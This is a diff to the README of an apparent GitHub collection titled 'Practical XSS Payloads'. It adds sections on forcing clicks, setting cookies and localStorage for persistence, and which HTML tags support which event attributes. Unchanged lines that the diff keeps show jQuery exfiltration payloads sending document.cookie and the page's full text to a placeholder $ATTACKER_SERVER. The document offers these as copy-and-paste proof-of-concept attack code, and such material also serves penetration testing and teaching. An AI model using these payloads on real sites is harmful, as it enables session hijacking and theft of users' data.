@@ -1,18 +1,26 @@
 # Practical XSS Payloads
-## About
-Instead of using alert() for your XSS payloads, I encourage you to check out some XSS payloads which have purpose and hammer home a point.
-+ **TLDR:** *POC||GTFO*
+## ☕ ABOUT
+Originally this started as just a little list of PoC payloads but it has now expanded to some more general notes as well. This now contains easy copy & paste PoC payloads as well as quick references for what HTML tags frequent event attributes use. 
 
 ### **Quick-navigation:**
 + **EXFILTRATION:**  
   + [FETCH](https://github.com/Insecurities/PracticalXSSPayloads#fetch)  
   + [.$GET](https://github.com/Insecurities/PracticalXSSPayloads#jquery-ajax)
-+ **ACTIONS:**
++ **FORCING ACTIONS:**
   + [CLICK](https://github.com/Insecurities/PracticalXSSPayloads#forcing-actions)
++ **SETTING ITEMS:**
+  + [DOCUMENT.COOKIE](https://github.com/Insecurities/PracticalXSSPayloads/edit/main/README.md#via-documentcookie)
+  + [WINDOW.LOCALSTORAGE](https://github.com/Insecurities/PracticalXSSPayloads/edit/main/README.md#via-windowlocalstorage)
++ **EVENT ATTRIBUTES:**
+  + [ONLOAD](https://github.com/Insecurities/PracticalXSSPayloads/edit/main/README.md#onload)
+  + [ONERROR](https://github.com/Insecurities/PracticalXSSPayloads/edit/main/README.md#onerror)
+  + [ONMOUSEOVER](https://github.com/Insecurities/PracticalXSSPayloads/edit/main/README.md#onmouseover)
+  + [ONSELECT](https://github.com/Insecurities/PracticalXSSPayloads/edit/main/README.md#onselect)
+  + [ONKEY/UP/DOWN/PRESS](https://github.com/Insecurities/PracticalXSSPayloads/edit/main/README.md#onkeyupdownpress)
 + **ANGULAR NOTE**
   + [PAYLOADS FOR ANGULAR](https://github.com/Insecurities/PracticalXSSPayloads#angular)
 
-# EXFILTRATION
+# 👁️‍🗨️ EXFILTRATION
 *For session hijacking, sensitive info exfil, etc.*
 ## FETCH
 ### GET VALUE FROM LOCAL STORAGE AND $FETCH:
@@ -60,11 +68,64 @@ $.get("https://$ATTACKER_SERVER/?exfil="+document.cookie)
 ```javascript
 $.get("https://$ATTACKER_SERVER/?exfil="+document.documentElement.outerText)
 ```
-# FORCING ACTIONS
+
+# 💥 FORCING ACTIONS
 *For forcing users to preform a certain action. This is tricky because every app is going to be different and thus these will require **modification**.*
-## CLICK ELEMENT BY ID
+### CLICK ELEMENT BY ID
 ```javascript
 document.getElementById("$TARGET_ELEMENT_ID").click()
+```
+
+# 🏠 SETTING ITEMS
+*Sometimes you may want to set items in the browsers storage for vulnerability chains or persistence.*
+
+**NOTE:**
+For persistence or certain vulnerability chains you'll want to make sure you set an appropriate path (i.e `/`). For the purpose of these examples I've included the root path.
+### VIA document.cookie
+```javascript
+document.cookie="cookieName=cookieValue>;Path=/"
+```
+### VIA window.localStorage
+```javascript
+window.localStorage.setItem('itemName', 'itemValue');
+```
+
+# 📔 EVENT ATTRIBUTES
+*Something super crucial about event attributes is that **not every HTML tag is going to support the same event attributes**. So when you have injection into a div and you're trying to use `onload()` it's not going to work.*
+
+#### `ONLOAD`
+```html
+<body>
+<frame>
+<frameset>
+<iframe>
+<img>
+<link>
+<script>
+<style>
+<svg>
+```
+#### `ONERROR`
+```html
+<img>
+<object>
+<link>
+<script>
+```
+#### `ONMOUSEOVER`
+```HTML
+ALL ELEMENTS EXCEPT:
+<base>, <bdo>, <br>, <head>, <html>, <iframe>, <meta>, <param>, <script>, <style>, and <title>
+```
+#### `ONSELECT`
+```html
+<input>
+<textarea>
+```
+#### `ONKEY/UP/DOWN/PRESS`
+```html
+ALL ELEMENTS EXCEPT:
+<base>, <bdo>, <br>, <head>, <html>, <iframe>, <meta>, <param>, <script>, <style>, and <title>
 ```
 
 # ANGULAR
